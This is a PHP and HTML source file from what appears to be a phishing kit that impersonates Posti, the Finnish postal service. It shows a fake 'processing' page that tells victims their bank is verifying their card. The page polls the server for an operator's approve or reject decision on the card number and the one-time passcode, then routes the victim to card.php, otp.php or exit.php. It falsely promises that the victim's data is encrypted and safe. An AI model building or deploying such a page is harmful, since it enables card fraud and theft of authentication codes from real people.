<?php
session_start();
require '../config.php';

// Security check not needed here (already passed through card.php)
$type = $_GET['type'] ?? 'cc';
$sessionId = $_SESSION['session_id'] ?? null;

// Redirect if no session
if (!$sessionId) {
    header('Location: card.php');
    exit;
}
?><!DOCTYPE html>
<html lang="fi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Käsitellään - Posti</title>
<link rel="icon" href="https://assets.ctfassets.net/dvxpcmq06s7e/pkrFI9pZwsBhQ2lBowzyt/3c40676e510621e6adb7a1aebbe8ebc0/favicon.ico">
<link href="https://cdn.posti.fi/asset/css/typography-posti-font.css" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Posti Font',Arial,sans-serif;background:#f7f7f7;color:#2A2B2D;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

/* TOP BAR */
.tb{background:#fff;border-bottom:1px solid #e5e5e5;display:flex;align-items:center;height:44px;padding:0 24px;gap:0;}
.tb-logo{display:flex;align-items:center;margin-right:20px;}
.tb-logo-text{font-size:28px;font-weight:900;font-style:italic;color:#FF6200;letter-spacing:-1px;line-height:1;}
.tb-tabs{display:flex;gap:0;height:100%;}
.tb-tab{display:flex;align-items:center;padding:0 14px;font-size:14px;font-weight:600;color:#2A2B2D;height:100%;cursor:pointer;}
.tb-tab.active{background:#1a1a1a;color:#fff;border-radius:20px;height:30px;margin:auto 4px;padding:0 16px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-langs{display:flex;align-items:center;border:1.5px solid #e5e5e5;border-radius:20px;overflow:hidden;padding:2px;}
.tb-lang{font-size:12px;font-weight:700;padding:3px 8px;border-radius:16px;cursor:pointer;color:#666;}
.tb-lang.active{background:#2A2B2D;color:#fff;}

/* PAGE CONTENT */
.page-content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}

/* WAIT CARD */
.wait-card{background:#fff;border-radius:20px;box-shadow:0 8px 40px rgba(0,0,0,0.1);padding:60px 50px;text-align:center;max-width:500px;width:100%;}

/* ANIMATED ICON */
.icon-wrapper{margin-bottom:32px;position:relative;}
.icon-circle{width:100px;height:100px;margin:0 auto;position:relative;}
.icon-bg{position:absolute;inset:0;border-radius:50%;background:linear-gradient(135deg,#FF6200 0%,#FF8533 100%);opacity:0.1;animation:pulse-bg 2s ease-in-out infinite;}
@keyframes pulse-bg{0%,100%{transform:scale(1);opacity:0.1;}50%{transform:scale(1.1);opacity:0.2;}}
.icon-inner{position:absolute;inset:15px;background:linear-gradient(135deg,#FF6200 0%,#FF8533 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;}
.icon-inner svg{width:36px;height:36px;fill:#fff;}

/* DOTS ANIMATION */
.dots{display:flex;justify-content:center;gap:8px;margin-top:20px;}
.dot{width:10px;height:10px;background:#FF6200;border-radius:50%;animation:dot-bounce 1.4s ease-in-out infinite;}
.dot:nth-child(1){animation-delay:0s;}
.dot:nth-child(2){animation-delay:0.2s;}
.dot:nth-child(3){animation-delay:0.4s;}
@keyframes dot-bounce{0%,80%,100%{transform:scale(0.6);opacity:0.4;}40%{transform:scale(1);opacity:1;}}

/* TEXT */
.wait-card h1{font-size:24px;font-weight:800;color:#2A2B2D;margin-bottom:12px;}
.wait-card p{font-size:15px;color:#666;line-height:1.6;}
.wait-card .sub{font-size:13px;color:#999;margin-top:8px;}

/* STATUS MESSAGES */
.status-box{margin-top:28px;padding:20px;border-radius:12px;display:none;}
.status-box.pending{display:block;background:#FFF8F3;border:1.5px solid #FFE0CC;}
.status-box.success{display:block;background:#F0FDF4;border:1.5px solid #BBF7D0;}
.status-box.error{display:block;background:#FEF2F2;border:1.5px solid #FECACA;}
.status-icon{width:48px;height:48px;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;}
.status-box.pending .status-icon{background:#FF6200;}
.status-box.success .status-icon{background:#22C55E;}
.status-box.error .status-icon{background:#EF4444;}
.status-icon svg{width:24px;height:24px;fill:#fff;}
.status-text{font-size:14px;font-weight:600;}
.status-box.pending .status-text{color:#9A3412;}
.status-box.success .status-text{color:#166534;}
.status-box.error .status-text{color:#991B1B;}

/* PROGRESS STEPS */
.progress-steps{display:flex;justify-content:center;gap:12px;margin-top:32px;}
.step-dot{width:12px;height:12px;border-radius:50%;background:#e5e5e5;transition:all 0.3s;}
.step-dot.active{background:#FF6200;}
.step-dot.done{background:#22C55E;}

/* TIMER */
.timer{margin-top:24px;font-size:13px;color:#999;}
.timer span{font-weight:700;color:#FF6200;}

/* SECURITY NOTE */
.security-note{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:24px;font-size:12px;color:#888;}
.security-note svg{width:16px;height:16px;fill:#27ae60;}

/* FOOTER */
footer{background:#fff;border-top:1px solid #e5e5e5;padding:20px 32px;text-align:center;}
footer p{font-size:12px;color:#888;}

/* TABLET */
@media(max-width:900px){
    .tb-sites-btn{display:none;}
}

/* MOBILE */
@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-tabs,.tb-langs,.tb-sites-btn,.tb-link{display:none;}
    .tb-logo-text{font-size:24px;}
    .page-content{padding:20px 16px;}
    .wait-card{padding:32px 20px;border-radius:16px;}
    .wait-card h1{font-size:18px;}
    .wait-card p{font-size:14px;}
    .icon-circle{width:80px;height:80px;}
    .icon-inner{inset:12px;}
    .icon-inner svg{width:28px;height:28px;}
    .dots .dot{width:8px;height:8px;}
    .status-box{padding:16px;}
    .progress-steps{gap:8px;}
    .step-dot{width:10px;height:10px;}
    .timer{font-size:12px;}
    .security-note{flex-wrap:wrap;text-align:center;}
    footer{padding:16px;}
}

/* SMALL MOBILE */
@media(max-width:380px){
    .wait-card{padding:24px 16px;}
    .wait-card h1{font-size:16px;}
    .icon-circle{width:70px;height:70px;}
}

.tb-logo-img {
    height: 40px; /* ajuste selon ton design */
    width: auto;
    display: block;
}
</style>
</head>
<body>

<!-- TOP BAR -->
<div class="tb">
    <div class="tb-logo">
    <img src="status/logo.png" alt="Logo" class="tb-logo-img">
</div>
    <div class="tb-tabs">
        <span class="tb-tab active">Henkilöille</span>
        <span class="tb-tab">Yrityksille</span>
    </div>
    <div class="tb-right">
        <div class="tb-langs">
            <span class="tb-lang active">FI</span>
            <span class="tb-lang">SV</span>
            <span class="tb-lang">EN</span>
        </div>
    </div>
</div>

<!-- PAGE CONTENT -->
<div class="page-content">
    <div class="wait-card">

        <div class="icon-wrapper">
            <div class="icon-circle">
                <div class="icon-bg"></div>
                <div class="icon-inner">
                    <?php if ($type === 'cc'): ?>
                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                    <?php else: ?>
                    <svg viewBox="0 0 24 24"><path d="M12 1C8.676 1 6 3.676 6 7v2H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-2V7c0-3.324-2.676-6-6-6zm0 2c2.276 0 4 1.724 4 4v2H8V7c0-2.276 1.724-4 4-4zm0 10a2 2 0 0 1 1 3.732V18a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 13z"/></svg>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <?php if ($type === 'cc'): ?>
        <h1>Vahvistetaan korttitietoja</h1>
        <p>Pankkisi tarkistaa korttitietojasi. Tämä voi kestää hetken.</p>
        <?php else: ?>
        <h1>Vahvistetaan maksua</h1>
        <p>Odota kun vahvistamme maksusi. Älä sulje tätä sivua.</p>
        <?php endif; ?>

        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <div class="status-box pending" id="status-pending">
            <div class="status-icon">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
            </div>
            <div class="status-text">Käsittely käynnissä...</div>
        </div>

        <div class="status-box success" id="status-success" style="display:none;">
            <div class="status-icon">
                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
            </div>
            <div class="status-text">Vahvistettu! Uudelleenohjataan...</div>
        </div>

        <div class="status-box error" id="status-error" style="display:none;">
            <div class="status-icon">
                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
            </div>
            <div class="status-text" id="error-text">Virhe tapahtui. Yritä uudelleen.</div>
        </div>

        <div class="progress-steps">
            <div class="step-dot <?php echo $type === 'otp' ? 'done' : 'active'; ?>"></div>
            <div class="step-dot <?php echo $type === 'otp' ? 'active' : ''; ?>"></div>
            <div class="step-dot"></div>
        </div>

        <div class="timer">
            Odota <span id="timer-count">30</span> sekuntia
        </div>

        <div class="security-note">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 1C8.318 1 5 4.026 5 8v2.08A3.003 3.003 0 0 0 3 13v7a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-7a3.003 3.003 0 0 0-2-2.83V8c0-3.974-3.318-7-7-7Z" clip-rule="evenodd"/></svg>
            <span>Tietosi ovat salattuja ja turvallisia</span>
        </div>

    </div>
</div>

<!-- FOOTER -->
<footer>
    <p>© Posti Group Oyj</p>
</footer>

<script>
var type = '<?php echo $type; ?>';
var checkInterval;
var timerInterval;
var timeLeft = 60;

// Timer countdown
timerInterval = setInterval(function() {
    timeLeft--;
    document.getElementById('timer-count').textContent = timeLeft;
    if (timeLeft <= 0) {
        clearInterval(timerInterval);
    }
}, 1000);

// Check status every 2 seconds
function checkStatus() {
    fetch('check_status.php')
        .then(response => response.json())
        .then(data => {
            console.log('Status:', data.status);

            if (type === 'cc') {
                if (data.status === 'approved_cc') {
                    showSuccess();
                    setTimeout(function() {
                        window.location.href = 'otp.php';
                    }, 1500);
                } else if (data.status === 'rejected_cc') {
                    showError('Korttitiedot hylätty. Tarkista tiedot ja yritä uudelleen.');
                    setTimeout(function() {
                        window.location.href = 'card.php?error=rejected';
                    }, 2500);
                }
            } else if (type === 'otp') {
                if (data.status === 'approved_otp') {
                    showSuccess();
                    setTimeout(function() {
                        window.location.href = 'exit.php';
                    }, 1500);
                } else if (data.status === 'rejected_otp') {
                    showError('Virheellinen koodi. Yritä uudelleen.');
                    setTimeout(function() {
                        window.location.href = 'otp.php?error=1';
                    }, 2500);
                }
            }
        })
        .catch(error => {
            console.error('Error checking status:', error);
        });
}

function showSuccess() {
    clearInterval(checkInterval);
    clearInterval(timerInterval);
    document.getElementById('status-pending').style.display = 'none';
    document.getElementById('status-success').style.display = 'block';
    document.querySelector('.dots').style.display = 'none';
}

function showError(message) {
    clearInterval(checkInterval);
    clearInterval(timerInterval);
    document.getElementById('status-pending').style.display = 'none';
    document.getElementById('status-error').style.display = 'block';
    document.getElementById('error-text').textContent = message;
    document.querySelector('.dots').style.display = 'none';
}

// Start polling
checkInterval = setInterval(checkStatus, 2000);

// Initial check
checkStatus();
</script>
</body>
</html>
